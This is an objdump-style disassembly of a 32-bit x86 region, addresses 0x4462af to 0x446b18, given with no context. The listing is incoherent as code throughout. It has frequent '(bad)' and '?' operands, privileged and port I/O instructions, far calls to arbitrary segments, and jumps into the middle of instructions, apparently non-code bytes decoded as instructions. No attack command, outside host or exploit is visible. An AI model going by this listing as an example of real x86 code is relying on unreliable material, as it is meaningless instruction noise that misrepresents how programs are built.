  4462af:	mov    DWORD PTR [esi],esp
  4462b1:	inc    ecx
  4462b2:	mov    eax,0x3fddcc44
  4462b7:	std    
  4462b8:	add    eax,0xa4eadb8f
  4462bd:	jne    0x4462bd
  4462bf:	xchg   esp,eax
  4462c0:	cmp    al,0xf2
  4462c2:	or     al,0xaf
  4462c4:	ret    0xbf41
  4462c7:	je     0x446259
  4462c9:	dec    ecx
  4462ca:	retf   
  4462cb:	push   edi
  4462cc:	push   ebp
  4462cd:	iret   
  4462ce:	stc    
  4462cf:	lock sub ebp,edx
  4462d2:	push   esi
  4462d3:	inc    esp
  4462d4:	pop    ds
  4462d5:	or     DWORD PTR [edx-0x74],esi
  4462d8:	and    al,0xbb
  4462da:	pop    ebx
  4462db:	xor    eax,0x57ba4d2
  4462e0:	mov    cl,0x7b
  4462e2:	jge    0x446336
  4462e4:	std    
  4462e5:	cmp    DWORD PTR [eax-0x419ee7d8],ebp
  4462eb:	push   esp
  4462ec:	mov    al,0x7
  4462ee:	call   0x41e8:0x7be7c50c
  4462f5:	mov    ebp,0x791910c7
  4462fa:	popf   
  4462fb:	push   edi
  4462fc:	mov    dh,0xc1
  4462fe:	int    0x2
  446300:	fstp   DWORD PTR [ebx+0x424ab4db]
  446306:	pushf  
  446307:	ds xor ebp,esi
  44630a:	or     edx,DWORD PTR [edx]
  44630c:	pop    ebp
  44630d:	pop    ss
  44630e:	mov    ecx,0xb929fac4
  446313:	xor    dl,dh
  446315:	pop    esp
  446316:	cmp    al,BYTE PTR [edi+esi*2]
  446319:	or     DWORD PTR [ecx+0x4ea0eb50],0xb2b9b9e6
  446323:	mov    al,0xa6
  446325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446326:	pop    ebx
  446327:	jg     0x446380
  446329:	xchg   esp,eax
  44632a:	xchg   esp,eax
  44632b:	jecxz  0x4462ad
  44632d:	cmp    BYTE PTR [edi-0x9],al
  446330:	cmc    
  446331:	(bad)  
  446332:	mov    ch,0xd4
  446334:	jp     0x44638c
  446336:	leave  
  446337:	or     eax,DWORD PTR ds:0x69e50f78
  44633d:	or     edx,DWORD PTR [edx+0x72920e7]
  446343:	repz push edx
  446345:	dec    eax
  446346:	shl    DWORD PTR [esi],0xe7
  446349:	popf   
  44634a:	pop    ebx
  44634b:	push   edx
  44634c:	bound  esi,QWORD PTR [ecx]
  44634e:	sub    dh,BYTE PTR [ecx+0x69]
  446351:	jle    0x4463b9
  446353:	imul   ecx,esp,0xfffffff4
  446356:	mov    ch,0xb4
  446358:	dec    esp
  446359:	pop    edx
  44635a:	fs scas al,BYTE PTR es:[edi]
  44635c:	test   DWORD PTR [ecx+0x2490ea20],esi
  446362:	jg     0x44630e
  446364:	sbb    bh,BYTE PTR [ecx]
  446366:	mov    al,0x15
  446368:	xor    al,0xd8
  44636a:	in     al,0x8a
  44636c:	and    DWORD PTR [ebx-0xe328f15],esp
  446372:	push   ss
  446373:	mov    ds:0xcfc4da17,al
  446378:	js     0x4463ea
  44637a:	jg     0x4463d2
  44637c:	or     DWORD PTR [edi+esi*4-0x14c0604c],0xffffffaf
  446384:	adc    eax,0x26f9d5e6
  446389:	ds and eax,0xf8c1b33a
  44638f:	fs push 0x16
  446392:	je     0x4463ec
  446394:	sahf   
  446395:	stc    
  446396:	cld    
  446397:	mov    eax,0xdeb63fcf
  44639c:	test   DWORD PTR [ebx+0x78],ebx
  44639f:	out    0x7f,eax
  4463a1:	dec    edi
  4463a2:	mov    BYTE PTR [ecx+eiz*1],dh
  4463a5:	(bad)  [esi-0x61]
  4463a8:	cli    
  4463a9:	add    DWORD PTR [ecx-0x46],esi
  4463ac:	loop   0x4463c7
  4463ae:	aad    0xf4
  4463b0:	xor    eax,0xd2e96044
  4463b5:	daa    
  4463b6:	push   edi
  4463b7:	jl     0x4463d1
  4463b9:	mov    DWORD PTR [ebx-0x6b528f35],edi
  4463bf:	enter  0x9a4a,0xeb
  4463c3:	adc    esi,DWORD PTR [eax+0x2127576f]
  4463c9:	mov    ecx,DWORD PTR [edx]
  4463cb:	inc    ebp
  4463cc:	imul   edx,DWORD PTR [ebx-0xee1ead2],0x9aa917fa
  4463d6:	retf   
  4463d7:	inc    eax
  4463d8:	cld    
  4463d9:	shl    DWORD PTR [eax-0x66],cl
  4463dc:	mov    cl,0xdb
  4463de:	fistp  QWORD PTR [edi-0x32]
  4463e1:	hlt    
  4463e2:	jo     0x44641a
  4463e4:	push   ebp
  4463e5:	cmp    esi,DWORD PTR [ecx-0x4159c94]
  4463eb:	mov    eax,ds:0x72755aaa
  4463f0:	and    BYTE PTR [ebp-0x3],dh
  4463f3:	xchg   esi,eax
  4463f4:	mov    al,0xa7
  4463f6:	retf   
  4463f7:	sbb    eax,0x67ebf601
  4463fc:	fmul   DWORD PTR [ecx-0x1e]
  4463ff:	push   0x5883ce9a
  446404:	sub    DWORD PTR [esi],esi
  446406:	les    edi,FWORD PTR [edi-0xc191ff2]
  44640c:	adc    eax,0xfeaa814
  446411:	retf   
  446412:	mov    esi,0xb6ed0677
  446417:	mov    bl,0xbe
  446419:	stos   BYTE PTR es:[edi],al
  44641a:	leave  
  44641b:	add    DWORD PTR [esi-0x7f25830f],ebp
  446421:	fwait
  446422:	sti    
  446423:	jo     0x4463f2
  446425:	les    esp,FWORD PTR [ebp-0x13]
  446428:	and    eax,0xd9bc2c2b
  44642d:	jecxz  0x446420
  44642f:	je     0x446456
  446431:	adc    eax,0x710a9dc2
  446436:	std    
  446437:	stos   DWORD PTR es:[edi],eax
  446438:	rcl    dh,0xb7
  44643b:	mov    cs,edx
  44643d:	(bad)  
  44643e:	xor    edi,0xffffffd1
  446441:	in     eax,dx
  446442:	dec    ecx
  446443:	push   ebx
  446444:	shr    DWORD PTR [ecx+0x34bef3bd],0xb0
  44644b:	(bad)  
  44644c:	dec    esp
  44644d:	pop    esp
  44644e:	invd   
  446450:	sbb    bh,BYTE PTR [ecx]
  446452:	xchg   esi,eax
  446453:	add    al,0xf8
  446455:	out    0xf1,eax
  446457:	push   ss
  446458:	pop    ebx
  446459:	retf   0xaee3
  44645c:	ret    
  44645d:	and    DWORD PTR [ebx],esp
  44645f:	rol    BYTE PTR [ebx],cl
  446461:	pop    edi
  446462:	mov    ebp,0x7311d484
  446467:	mov    WORD PTR [ebp-0x80e85d8],ss
  44646d:	das    
  44646e:	sub    dh,ch
  446470:	sbb    edi,ecx
  446472:	test   DWORD PTR [esi-0x20ae3977],ebx
  446478:	mov    esp,0x30367c0c
  44647d:	sub    eax,0xbea1266
  446482:	mov    ds:0x9522a4ef,al
  446487:	adc    DWORD PTR [edx-0x79],0xd1d627b2
  44648e:	cmp    esi,DWORD PTR [eax]
  446490:	pushf  
  446491:	push   0x831eb456
  446496:	(bad)  
  446497:	fisub  WORD PTR [ecx]
  446499:	sub    eax,ebx
  44649b:	in     eax,0x59
  44649d:	aas    
  44649e:	cmp    ch,bh
  4464a0:	mov    ds:0x265eca79,al
  4464a5:	sub    eax,0xa4636361
  4464aa:	xor    DWORD PTR ss:[eax-0x53481b62],esp
  4464b1:	jno    0x446467
  4464b3:	inc    esp
  4464b4:	(bad)  
  4464b6:	clc    
  4464b7:	add    eax,0x6e2b9ec4
  4464bc:	xchg   esi,eax
  4464bd:	das    
  4464be:	push   es
  4464bf:	xchg   esp,eax
  4464c0:	jge    0x44649e
  4464c2:	jns    0x4464c7
  4464c4:	or     esi,DWORD PTR [ecx+edi*4+0x3dc632d4]
  4464cb:	mov    ah,0xf6
  4464cd:	cs icebp 
  4464cf:	pop    eax
  4464d0:	fwait
  4464d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4464d2:	pop    ecx
  4464d3:	std    
  4464d4:	sbb    al,dl
  4464d6:	add    al,0xa3
  4464d8:	inc    eax
  4464d9:	xchg   BYTE PTR [ebp-0x4533436a],bl
  4464df:	dec    eax
  4464e0:	dec    eax
  4464e1:	fisttp DWORD PTR [edx+0x3f7216ac]
  4464e7:	adc    ch,bh
  4464e9:	cli    
  4464ea:	aad    0xa0
  4464ec:	pop    esi
  4464ed:	int3   
  4464ee:	ret    
  4464ef:	inc    eax
  4464f0:	adc    BYTE PTR [ecx+0x143d15fc],ah
  4464f6:	(bad)  
  4464f7:	jmp    0xf1772f71
  4464fc:	dec    esi
  4464fd:	sub    eax,0xe9866181
  446502:	bound  ebx,QWORD PTR [ebx+0xdb45aa2]
  446508:	jg     0x446499
  44650a:	mov    dh,0x52
  44650c:	adc    eax,0xccef029e
  446511:	aam    0xd9
  446513:	into   
  446514:	sbb    edi,DWORD PTR [ecx]
  446516:	dec    eax
  446517:	mov    WORD PTR [edi+0x39a01f34],cs
  44651d:	test   al,0x5b
  44651f:	das    
  446520:	push   ss
  446521:	cmp    al,0x72
  446523:	retf   0xdc86
  446526:	jl     0x44654e
  446528:	or     ch,0xb8
  44652b:	xchg   esp,eax
  44652c:	xor    ecx,edx
  44652e:	cmp    bl,BYTE PTR [esi]
  446530:	push   esi
  446531:	jae    0x446594
  446533:	sahf   
  446534:	sbb    BYTE PTR [ecx-0x40c74fe5],ah
  44653a:	pushf  
  44653b:	lahf   
  44653c:	out    0xa4,al
  44653e:	jae    0x4464c8
  446540:	pushf  
  446541:	pushf  
  446542:	sub    eax,0x2d6cc049
  446547:	repnz scas al,BYTE PTR es:[edi]
  446549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44654a:	push   ebx
  44654b:	popa   
  44654c:	adc    al,0x26
  44654e:	mov    bl,0x4b
  446550:	sbb    ecx,ebx
  446552:	jns    0x446569
  446554:	mov    edi,0xc24d5af9
  446559:	ins    DWORD PTR es:[edi],dx
  44655a:	jecxz  0x44654e
  44655c:	test   esi,esp
  44655e:	pushf  
  44655f:	jmp    0x7cde:0xf71edfe3
  446566:	pop    ds
  446567:	pop    edx
  446568:	and    eax,0x53ecfa5f
  44656d:	rol    DWORD PTR [edi],0x41
  446570:	test   DWORD PTR [edx+0xdc2eff7],eax
  446576:	pop    esi
  446577:	inc    ebp
  446578:	and    BYTE PTR [ecx],cl
  44657a:	shr    esp,cl
  44657c:	bound  edx,QWORD PTR [ebp-0x619390b9]
  446582:	cmp    esi,DWORD PTR [eax+0x2ebbbaa6]
  446588:	sbb    eax,0x8020bf2e
  44658d:	cmp    BYTE PTR [edx+0x773dba34],0x52
  446594:	mov    dh,0xbe
  446596:	retf   0x1fdb
  446599:	mov    ebp,0xd5969215
  44659e:	adc    al,BYTE PTR [edi-0x4b11b908]
  4465a4:	aas    
  4465a5:	fwait
  4465a6:	xlat   BYTE PTR ds:[ebx]
  4465a7:	in     eax,dx
  4465a8:	add    esp,DWORD PTR [ebp+0x513879b]
  4465ae:	pop    edx
  4465af:	loope  0x446551
  4465b1:	jle    0x4465ee
  4465b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4465b4:	in     al,dx
  4465b5:	mov    eax,0x287294c6
  4465ba:	mov    ebx,0xf2a4675b
  4465bf:	arpl   WORD PTR ds:0x39f28681,ax
  4465c5:	and    cl,bl
  4465c7:	mov    bh,0x32
  4465c9:	cmp    DWORD PTR [ecx],esi
  4465cb:	lods   al,BYTE PTR ds:[esi]
  4465cc:	cdq    
  4465cd:	cmc    
  4465ce:	mov    ds:0x22302071,al
  4465d3:	loope  0x44656b
  4465d5:	mov    eax,ds:0xa27b56f0
  4465da:	add    al,cl
  4465dc:	inc    ebx
  4465dd:	loope  0x4465c8
  4465df:	rcl    BYTE PTR [edi+ebp*8],1
  4465e2:	jmp    0xf69999eb
  4465e7:	retf   
  4465e8:	xor    BYTE PTR [edx+0x1],bh
  4465eb:	adc    BYTE PTR [ebx+0x77],0x7f
  4465ef:	and    bl,BYTE PTR [ecx+0x257d0a86]
  4465f5:	les    edi,FWORD PTR [ecx+0x6ad15b24]
  4465fb:	data16 in al,dx
  4465fd:	test   DWORD PTR [esp+eax*4-0x22613fb8],edi
  446604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446605:	push   eax
  446606:	pop    esi
  446607:	out    0x70,al
  446609:	push   esp
  44660a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44660b:	mov    ch,0xed
  44660d:	and    al,0x73
  44660f:	(bad)  
  446610:	aad    0x37
  446612:	sub    dl,0x9
  446615:	stos   DWORD PTR es:[edi],eax
  446616:	adc    DWORD PTR [edi+0x6cbc50dc],edi
  44661c:	xor    al,0x39
  44661e:	(bad)  
  44661f:	jl     0x446682
  446621:	xchg   esi,eax
  446622:	out    0x3f,eax
  446624:	mov    ds:0x35901bc7,al
  446629:	sub    edx,DWORD PTR [ecx+0x735cce7]
  44662f:	and    ecx,DWORD PTR ds:0x455dafed
  446635:	xchg   ecx,eax
  446636:	fwait
  446637:	out    dx,eax
  446638:	sbb    eax,DWORD PTR ds:0xea85359c
  44663e:	pop    ss
  44663f:	clc    
  446640:	in     al,0xe3
  446642:	loopne 0x4466bf
  446644:	rcr    BYTE PTR [edx+edi*8],cl
  446647:	jb     0x446687
  446649:	inc    BYTE PTR [edi+0x25]
  44664c:	jle    0x4465dd
  44664e:	sti    
  44664f:	rol    DWORD PTR [edi-0xb0f41f3],1
  446655:	popf   
  446656:	fwait
  446657:	push   esi
  446658:	ds out dx,eax
  44665a:	jl     0x446646
  44665c:	jb     0x44664a
  44665e:	retf   0xe26c
  446661:	loopne 0x446618
  446663:	mov    ah,0xc1
  446665:	jnp    0x4466a6
  446667:	or     al,0x49
  446669:	push   ebx
  44666a:	in     eax,0xdd
  44666c:	rcl    esi,cl
  44666e:	mov    bh,0x6c
  446670:	ret    0x3a64
  446673:	push   edi
  446674:	fs and ah,al
  446677:	adc    al,0x5e
  446679:	fwait
  44667a:	pop    eax
  44667b:	xor    eax,0xe1305b1c
  446680:	sub    cl,cl
  446682:	mov    ?,WORD PTR [edx-0x72]
  446685:	sti    
  446686:	pop    esi
  446687:	push   esp
  446688:	push   ebx
  446689:	sub    ecx,eax
  44668b:	daa    
  44668c:	sahf   
  44668d:	jo     0x4466bd
  44668f:	in     eax,0x8d
  446691:	aad    0x2c
  446693:	jg     0x446666
  446695:	xor    al,0xa7
  446697:	in     eax,0x91
  446699:	popa   
  44669a:	pop    ebx
  44669b:	inc    edi
  44669c:	xor    eax,0x11f34839
  4466a1:	jmp    0x29618edb
  4466a6:	xchg   esi,eax
  4466a7:	aas    
  4466a8:	mov    WORD PTR [ebx-0x344ebdcf],fs
  4466ae:	sub    ebp,DWORD PTR [ebx+0xa]
  4466b1:	int    0x19
  4466b3:	xor    esp,DWORD PTR [eax]
  4466b5:	repz push edx
  4466b7:	add    BYTE PTR [ecx+ecx*8],bl
  4466ba:	idiv   BYTE PTR [edi+edi*1-0x703bbf8a]
  4466c1:	cwde   
  4466c2:	mov    edi,0x7fc91618
  4466c7:	pop    ecx
  4466c8:	rcr    cl,1
  4466ca:	jnp    0x44668c
  4466cc:	sbb    DWORD PTR [ecx],ebp
  4466ce:	pop    ss
  4466cf:	ins    BYTE PTR es:[edi],dx
  4466d0:	call   0xbb9a:0xc2d82b86
  4466d7:	test   DWORD PTR [edx-0x10557a12],ecx
  4466dd:	loop   0x4466e9
  4466df:	test   eax,0xc4bd5b9f
  4466e4:	hlt    
  4466e5:	jg     0x4466fe
  4466e7:	dec    ebx
  4466e8:	std    
  4466e9:	pushf  
  4466ea:	cmp    ebp,DWORD PTR [esi-0x5a]
  4466ed:	mov    eax,0x82b98c62
  4466f2:	jne    0x446765
  4466f4:	hlt    
  4466f5:	xor    dh,BYTE PTR [edx-0x2defdac]
  4466fb:	or     al,0xc8
  4466fd:	inc    esi
  4466fe:	(bad)  
  4466ff:	pop    ecx
  446700:	pop    ds
  446701:	fnstcw WORD PTR [edi-0x56]
  446704:	inc    edi
  446705:	mov    edi,0xcca55e06
  44670a:	adc    eax,0x33d5d1ee
  44670f:	and    bl,BYTE PTR fs:[ecx+0x488baf6f]
  446716:	into   
  446717:	mov    eax,ds:0x178c1308
  44671c:	push   cs
  44671d:	jno    0x44679b
  44671f:	xchg   DWORD PTR [ecx-0x70],edi
  446722:	xor    ah,dh
  446724:	clc    
  446725:	sbb    dh,dh
  446727:	inc    ecx
  446728:	cld    
  446729:	xor    ah,BYTE PTR [ebx]
  44672b:	cmp    DWORD PTR [ebp+0x5b58bc00],edi
  446731:	mov    eax,ds:0x46758e4b
  446736:	mov    dl,0x1
  446738:	mov    esi,0x24c99c81
  44673d:	inc    edx
  44673e:	call   0xdf60:0xbbca3216
  446745:	jle    0x446786
  446747:	test   eax,0xe6c5d11c
  44674c:	sub    al,bl
  44674e:	addr16 jl 0x44672c
  446751:	pusha  
  446752:	and    ah,BYTE PTR [edx+0x4b2d8b7]
  446758:	imul   ebx,DWORD PTR [eax-0x7a43f88c],0xa8ebf50c
  446762:	dec    edx
  446763:	xor    eax,0xf6b9aa4e
  446768:	pop    ss
  446769:	fnstcw WORD PTR [edi]
  44676b:	cmp    esi,DWORD PTR [edi-0x4396ae7f]
  446771:	addr16 or eax,0x5ba41f85
  446777:	fimul  WORD PTR [ecx-0x46]
  44677a:	and    BYTE PTR [ecx-0x4d9f12f1],ah
  446780:	lods   eax,DWORD PTR ds:[esi]
  446781:	and    bl,BYTE PTR [edi-0x18]
  446784:	data16 mov al,0xf8
  446787:	jmp    0x1cef:0x6c606135
  44678e:	fmulp  st(3),st
  446790:	pop    ss
  446791:	out    dx,al
  446792:	mov    esp,0x80c0b2a4
  446797:	fcom   QWORD PTR [ebx-0x42eb134f]
  44679d:	mov    ds:0x99408b0a,al
  4467a2:	or     ebx,ecx
  4467a4:	(bad)  
  4467a5:	call   0x396b:0x7612f784
  4467ac:	jns    0x4467df
  4467ae:	hlt    
  4467af:	jne    0x446787
  4467b1:	cli    
  4467b2:	push   ds
  4467b3:	adc    DWORD PTR [ebp-0x5e65de4b],ecx
  4467b9:	push   ebp
  4467ba:	retf   
  4467bb:	aas    
  4467bc:	xchg   edi,eax
  4467bd:	lea    esi,[eax+edi*4+0x61]
  4467c1:	fidiv  WORD PTR [edx+0x446d84f0]
  4467c7:	(bad)  
  4467c8:	adc    eax,0x721bf3ca
  4467cd:	cdq    
  4467ce:	mov    DWORD PTR [esp+eiz*2-0x44],esp
  4467d2:	popf   
  4467d3:	xor    DWORD PTR [ebp+0x6ee4ffb2],esp
  4467d9:	scas   eax,DWORD PTR es:[edi]
  4467da:	adc    ebp,ebx
  4467dc:	and    ebx,DWORD PTR [ecx-0x71302b51]
  4467e2:	ficomp DWORD PTR [eax-0x6a]
  4467e5:	lds    ebx,FWORD PTR [ebx-0x2883c667]
  4467eb:	(bad)  ds:0x22a252c5
  4467f1:	leave  
  4467f2:	imul   edx,DWORD PTR [edx],0x71
  4467f5:	sbb    DWORD PTR [ebx],0xfba3964f
  4467fb:	int3   
  4467fc:	retf   0x565b
  4467ff:	rcr    DWORD PTR [ebx+0x1cc39f9b],1
  446805:	dec    ecx
  446806:	jns    0x4467ac
  446808:	push   0x1b120bce
  44680d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44680e:	mov    ebx,0x38a40c1a
  446813:	sar    DWORD PTR [edx+0x2d340887],cl
  446819:	cld    
  44681a:	mov    edx,0x17f05614
  44681f:	fist   DWORD PTR [esi]
  446821:	sbb    BYTE PTR [edi+0x79dd22d7],0xdc
  446828:	ins    DWORD PTR es:[edi],dx
  446829:	les    esi,FWORD PTR [edi-0x49d38341]
  44682f:	xchg   esp,eax
  446830:	fs icebp 
  446832:	cmp    al,0x13
  446834:	push   es
  446835:	xchg   esp,eax
  446836:	or     edi,ebx
  446838:	pop    es
  446839:	push   esi
  44683a:	mov    BYTE PTR [ecx],al
  44683c:	leave  
  44683d:	mov    eax,ds:0xa89ffa92
  446842:	stos   BYTE PTR es:[edi],al
  446843:	dec    esi
  446844:	push   ds
  446845:	leave  
  446846:	mov    dl,0x36
  446848:	mov    ds:0xe44dfc25,al
  44684d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44684e:	jmp    0x44689a
  446850:	and    al,0x67
  446852:	mov    cl,BYTE PTR [esi+eax*8]
  446855:	and    al,dl
  446857:	dec    esp
  446858:	test   eax,0x35f4b9b7
  44685d:	sub    BYTE PTR [eax],bh
  44685f:	cld    
  446860:	push   ebp
  446861:	mov    edi,0x7a0ee88e
  446866:	pop    edx
  446867:	pushf  
  446868:	sbb    eax,0x34763c19
  44686d:	iret   
  44686e:	and    cl,BYTE PTR [ecx-0x5320d192]
  446874:	test   DWORD PTR [eax+0x19d6c69b],ebp
  44687a:	xor    al,0x13
  44687c:	daa    
  44687d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44687e:	iret   
  44687f:	dec    esp
  446880:	dec    edi
  446881:	pop    ecx
  446882:	cmp    eax,0x5f3bc290
  446887:	cmp    edx,edx
  446889:	dec    ebp
  44688a:	call   0xd8e6:0x6ceba5f1
  446891:	in     al,dx
  446892:	test   dl,al
  446894:	and    bl,BYTE PTR [ecx-0x17]
  446897:	(bad)  [esi+0x5559a25e]
  44689d:	mov    ds:0xc151c79b,al
  4468a2:	retf   0xeaf3
  4468a5:	(bad)  
  4468a7:	add    eax,0xf4b215af
  4468ac:	jge    0x44685b
  4468ae:	push   ss
  4468af:	ds and eax,0x83e83d7f
  4468b5:	jnp    0x4468ca
  4468b7:	xchg   esp,eax
  4468b8:	sub    al,0xd9
  4468ba:	fs (bad) 
  4468bd:	call   0x9d5a7133
  4468c2:	jmp    0x3120:0x6b9e8c97
  4468c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4468ca:	xchg   BYTE PTR [ecx+ebx*2-0x52],bl
  4468ce:	mov    ch,0xad
  4468d0:	mov    esi,0x5ef85bae
  4468d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4468d6:	xlat   BYTE PTR ds:[ebx]
  4468d7:	push   ebx
  4468d8:	pop    esp
  4468d9:	es enter 0xd6eb,0xee
  4468de:	push   edi
  4468df:	int3   
  4468e0:	push   ds
  4468e1:	jg     0x4468e9
  4468e3:	add    bh,0x46
  4468e6:	pusha  
  4468e7:	fidiv  WORD PTR [edx-0x25]
  4468ea:	mov    bh,0x84
  4468ec:	pop    ebp
  4468ed:	out    dx,eax
  4468ee:	shl    BYTE PTR [ebp+eiz*2+0x79],0xcf
  4468f3:	jmp    0x6cf7:0xd5eb6aa8
  4468fa:	xor    eax,0x170eae3f
  4468ff:	push   ebp
  446900:	xor    BYTE PTR [ecx-0x3fdaf946],dh
  446906:	dec    ebp
  446907:	enter  0x8217,0x77
  44690b:	mov    esi,0xef7b1359
  446910:	cmp    ebp,ebp
  446912:	ins    DWORD PTR es:[edi],dx
  446913:	sbb    ecx,DWORD PTR [ebx]
  446915:	mov    eax,0x79cc64bf
  44691a:	pop    ebp
  44691b:	(bad)  
  44691c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44691d:	xchg   edx,eax
  44691e:	adc    eax,0x124968f0
  446923:	mov    ecx,0xfa5600ed
  446928:	cmp    DWORD PTR [ebp-0x45],ebp
  44692b:	xor    al,0x74
  44692d:	rcr    edx,0xcf
  446930:	add    eax,0x90f3fa53
  446935:	cwde   
  446936:	sahf   
  446937:	cdq    
  446938:	out    dx,eax
  446939:	push   0x27
  44693b:	sub    BYTE PTR [edx-0x3e5f945c],0x18
  446942:	push   es
  446943:	jmp    0x4468db
  446945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446946:	fwait
  446947:	adc    edi,DWORD PTR ds:0xeef790f7
  44694d:	loopne 0x4468e0
  44694f:	sti    
  446950:	dec    eax
  446951:	sbb    DWORD PTR [ecx],0xffffffe7
  446954:	sub    eax,0xa004e3c6
  446959:	pop    edi
  44695a:	jne    0x4469c3
  44695c:	xor    eax,0x3af19a9a
  446961:	aam    0x3c
  446963:	jns    0x446983
  446965:	or     DWORD PTR [edx-0x778dd478],ebx
  44696b:	adc    ebx,esi
  44696d:	cdq    
  44696e:	mov    ebx,0x97d3441
  446973:	jne    0x446930
  446975:	sub    ecx,DWORD PTR [ecx+0x71]
  446978:	in     eax,0x8a
  44697a:	les    ebx,FWORD PTR [ebx]
  44697c:	and    BYTE PTR [ecx+0x3aa7802f],ah
  446982:	mov    cl,0x25
  446984:	in     eax,0x25
  446986:	ins    DWORD PTR es:[edi],dx
  446987:	in     al,dx
  446988:	sar    bh,1
  44698a:	adc    cl,dl
  44698c:	push   ds
  44698d:	jns    0x446920
  44698f:	test   al,0x76
  446991:	jge    0x446968
  446993:	je     0x44696d
  446995:	xchg   esi,eax
  446996:	shr    DWORD PTR [eax],cl
  446998:	jmp    FWORD PTR [eax-0x4c9191c5]
  44699e:	call   0x4c6c6122
  4469a3:	mov    ebx,0x44baf9d0
  4469a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4469a9:	dec    esp
  4469aa:	push   edx
  4469ab:	clc    
  4469ac:	fs fwait
  4469ae:	pop    ebx
  4469af:	mov    ebp,DWORD PTR [ebp+0x10a431f4]
  4469b5:	pop    eax
  4469b6:	or     edi,DWORD PTR [esi]
  4469b8:	lea    ebp,[edx-0x28ce978d]
  4469be:	push   esi
  4469bf:	es and ebx,edi
  4469c2:	adc    eax,0x6c82652b
  4469c7:	jmp    0x8a10:0x836fd702
  4469ce:	sbb    BYTE PTR [edi-0x7e386382],bh
  4469d4:	out    0xa8,eax
  4469d6:	repz fld st(6)
  4469d9:	cmp    eax,0xb0ee5f47
  4469de:	fistp  WORD PTR [edi+esi*2+0x41]
  4469e2:	sbb    BYTE PTR [ebp-0xb4dc568],0x3a
  4469e9:	pop    es
  4469ea:	jmp    0xd780:0x77abd984
  4469f1:	push   ebp
  4469f2:	mov    esi,0x6f440c44
  4469f7:	ret    0x2359
  4469fa:	mov    bh,0x54
  4469fc:	add    BYTE PTR [edx-0x34],cl
  4469ff:	popf   
  446a00:	adc    eax,0xa0e999f7
  446a05:	or     eax,0xe92449c3
  446a0a:	fwait
  446a0b:	xchg   esp,eax
  446a0c:	jmp    0x4469b0
  446a0e:	pusha  
  446a0f:	jmp    0x93f9:0x68eba150
  446a16:	add    BYTE PTR [esi+0x77],ah
  446a19:	jge    0x446a7f
  446a1b:	bnd jbe 0x4469ae
  446a1e:	jb     0x446a87
  446a20:	pop    ds
  446a21:	call   0x94cc0edd
  446a26:	sub    eax,0xc813e88
  446a2b:	loopne 0x446a4c
  446a2d:	popf   
  446a2e:	mov    ds:0xe724f808,al
  446a33:	ins    BYTE PTR es:[edi],dx
  446a34:	(bad)  
  446a35:	fbstp  TBYTE PTR [edx-0x3696686c]
  446a3b:	rcr    ebp,cl
  446a3d:	sahf   
  446a3e:	jmp    0x446a9a
  446a40:	popf   
  446a41:	ret    
  446a42:	mov    al,ds:0x9200bb16
  446a47:	inc    eax
  446a48:	and    ch,BYTE PTR [eax+0x34498a3b]
  446a4e:	aad    0x58
  446a50:	ficom  WORD PTR [ebx-0x3d]
  446a53:	add    DWORD PTR [edi-0x62],ebx
  446a56:	or     ebp,DWORD PTR [ecx-0x3f]
  446a59:	adc    al,0xf7
  446a5b:	xor    cl,BYTE PTR [eax]
  446a5d:	jge    0x446aa8
  446a5f:	add    DWORD PTR ds:0x2342b909,esp
  446a65:	shl    DWORD PTR [edx-0x60],cl
  446a68:	jmp    0x8f56f614
  446a6d:	mov    eax,0xfe51c08c
  446a72:	mov    eax,ds:0x3b9a1148
  446a77:	pop    eax
  446a78:	(bad)  
  446a7a:	stc    
  446a7b:	add    al,0xd6
  446a7d:	sar    bl,cl
  446a7f:	inc    ebp
  446a80:	sub    DWORD PTR [ebp+0x34],eax
  446a83:	in     eax,0xa2
  446a85:	test   BYTE PTR [ebx],cl
  446a87:	ficomp DWORD PTR [eax]
  446a89:	sbb    DWORD PTR [edi-0x27],edi
  446a8c:	shr    dl,0x56
  446a8f:	and    ecx,DWORD PTR [ecx-0x78]
  446a92:	(bad)  
  446a93:	mov    edi,0x3ecba4a3
  446a98:	sub    eax,0x933945bf
  446a9d:	jmp    0xa730e279
  446aa2:	jmp    0xe6e75b04
  446aa7:	xor    al,0xee
  446aa9:	cdq    
  446aaa:	cmp    DWORD PTR [ecx],esp
  446aac:	lea    esp,[ebx+0x3d86afcb]
  446ab2:	mov    bh,0x47
  446ab4:	push   eax
  446ab5:	sbb    ch,BYTE PTR [edi-0x60bbc6b4]
  446abb:	xchg   ebp,eax
  446abc:	sub    eax,0xd1e7902f
  446ac1:	mov    eax,ds:0xdd32244b
  446ac6:	icebp  
  446ac7:	fdivr  st(1),st
  446ac9:	fidivr DWORD PTR [ebp+0x7f]
  446acc:	adc    ebp,edi
  446ace:	idiv   BYTE PTR [ebx-0x232b91e3]
  446ad4:	pusha  
  446ad5:	adc    ch,al
  446ad7:	push   edx
  446ad8:	dec    edi
  446ad9:	xchg   DWORD PTR [ecx+0x198e3594],edi
  446adf:	mov    WORD PTR [edi+0x186d5b9c],?
  446ae5:	scas   al,BYTE PTR es:[edi]
  446ae6:	pop    esp
  446ae7:	nop
  446ae8:	lods   eax,DWORD PTR ds:[esi]
  446ae9:	mov    al,ds:0x16a4ca01
  446aee:	mov    edx,0xbf57604
  446af3:	pusha  
  446af4:	adc    eax,0xae9de03
  446af9:	cmp    eax,0xf91877b6
  446afe:	(bad)
  446b02:	pop    ss
  446b03:	lock push edx
  446b05:	test   al,0xb
  446b07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446b08:	xchg   esi,eax
  446b09:	jne    0x446afd
  446b0b:	add    DWORD PTR [eax+0x3ad79b5e],0x19a4b14c
  446b15:	test   al,0x33
  446b17:	dec    eax
  446b18:	xchg   ebp,eax
